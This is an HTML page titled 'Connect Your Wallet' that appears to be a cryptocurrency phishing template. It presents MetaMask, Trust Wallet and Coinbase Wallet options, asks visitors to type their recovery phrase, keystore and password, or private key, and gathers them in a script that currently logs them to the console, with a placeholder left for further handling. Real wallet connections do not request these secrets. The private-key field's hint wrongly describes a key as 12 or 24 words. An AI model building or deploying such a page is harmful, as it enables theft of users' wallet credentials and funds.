<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connect Your Wallet</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f9f9f9;
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        header {
            background-color: #4CAF50;
            color: #fff;
            text-align: center;
            padding: 20px;
        }

        section {
            margin: 20px;
            padding: 40px;
            background-color: #fff;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
        }

        h1 {
            font-size: 3em;
            color: #333;
        }

        p {
            font-size: 1.4em;
            line-height: 1.6;
            color: #555;
        }

        .wallet-actions {
            display: flex;
            flex-wrap: wrap;
            justify-content: space-around;
            margin-top: 30px;
        }

        .wallet-action {
            background-color: #3498db;
            color: #fff;
            padding: 15px 30px;
            margin: 20px;
            text-align: center;
            text-decoration: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .wallet-action:hover {
            background-color: #2980b9;
        }

        .wallet-icon {
            font-size: 2em;
            margin-bottom: 10px;
        }

        .selected-wallet {
            border: 2px solid #4CAF50;
        }

        #wallet-connect-form {
            display: none;
            margin-top: 20px;
        }

        label {
            display: block;
            margin-bottom: 10px;
        }

        select, input, textarea {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
        }

        button {
            background-color: #3498db;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <header>
        <h1>Connect Your Wallet</h1>
        <p>Choose your preferred wallet type and enter your credentials to connect.</p>
    </header>

    <section>
        <div class="wallet-actions">
            <!-- Wallet options dynamically generated from the provided list -->
            <div class="wallet-action" onclick="showWalletForm(this, 'MetaMask')">
                <span class="wallet-icon">ðŸŸ¢</span> MetaMask
            </div>
            <div class="wallet-action" onclick="showWalletForm(this, 'Trust Wallet')">
                <span class="wallet-icon">ðŸŸ¢</span> Trust Wallet
            </div>
            <div class="wallet-action" onclick="showWalletForm(this, 'Coinbase Wallet')">
                <span class="wallet-icon">ðŸŸ¢</span> Coinbase Wallet
            </div>
            <!-- Add more wallet options dynamically -->
        </div>

        <form id="wallet-connect-form">
            <label for="wallet-type">Selected Wallet:</label>
            <input type="text" id="selected-wallet" readonly>

            <label for="wallet-info-type">Select Wallet Information Type:</label>
            <select id="wallet-info-type" onchange="showInfoInput()">
                <option value="phrase">Phrase</option>
                <option value="keystore">Keystore</option>
                <option value="private-key">Private Key</option>
            </select>

            <div id="info-input-container"></div>

            <button type="button" onclick="connectWallet()">Connect</button>
        </form>
    </section>

    <script>
        function showWalletForm(element, wallet) {
            // Remove the 'selected-wallet' class from all wallet-action elements
            const walletActions = document.querySelectorAll('.wallet-action');
            walletActions.forEach(action => action.classList.remove('selected-wallet'));

            // Add the 'selected-wallet' class to the clicked wallet-action element
            element.classList.add('selected-wallet');

            document.getElementById('selected-wallet').value = wallet;
            document.getElementById('wallet-connect-form').style.display = 'block';

            // Show or hide information input based on the selected wallet type
            showInfoInput();
        }

        function showInfoInput() {
            // Retrieve selected information type
            const walletInfoType = document.getElementById('wallet-info-type').value;

            // Remove any existing information input elements
            const infoInputContainer = document.getElementById('info-input-container');
            infoInputContainer.innerHTML = '';

            // Dynamically create and append information input fields based on the selected type
            switch (walletInfoType) {
                case 'phrase':
                    infoInputContainer.innerHTML = `
                        <label for="wallet-phrase">Enter your recovery phrase:</label>
                        <textarea id="wallet-phrase" placeholder="Typical 12 (sometimes 24) words separated by single spaces." rows="4"></textarea>
                    `;
                    break;
                case 'keystore':
                    infoInputContainer.innerHTML = `
                        <label for="wallet-keystore">Enter Keystore:</label>
                        <input type="text" id="wallet-keystore" placeholder="Several lines of text beginning with '{...}'">
                        <label for="wallet-password">Wallet Password:</label>
                        <input type="password" id="wallet-password" placeholder="Enter your password">
                    `;
                    break;
                case 'private-key':
                    infoInputContainer.innerHTML = `
                        <label for="wallet-private-key">Enter your Private Key:</label>
                        <input type="text" id="wallet-private-key" placeholder="Typically 12 (sometimes 24) words separated by a single space.">
                    `;
                    break;
                default:
                    break;
            }
        }

        function connectWallet() {
            // Retrieve selected wallet type, information type, and credentials
            const selectedWallet = document.getElementById('selected-wallet').value;
            const walletInfoType = document.getElementById('wallet-info-type').value;

            // Retrieve information input based on the selected type
            let walletCredentials;
            switch (walletInfoType) {
                case 'phrase':
                    walletCredentials = document.getElementById('wallet-phrase').value;
                    break;
                case 'keystore':
                    const walletKeystore = document.getElementById('wallet-keystore').value;
                    const walletPassword = document.getElementById('wallet-password').value;
                    walletCredentials = { keystore: walletKeystore, password: walletPassword };
                    break;
                case 'private-key':
                    walletCredentials = document.getElementById('wallet-private-key').value;
                    break;
                default:
                    break;
            }

            // Perform wallet connection logic (use web3 libraries)
            // For simplicity, you can log the wallet type, information type, and credentials to the console
            console.log('Selected Wallet:', selectedWallet);
            console.log('Information Type:', walletInfoType);
            console.log('Credentials:', walletCredentials);

            // Add your actual wallet connection logic here
        }
    </script>
</body>
</html>
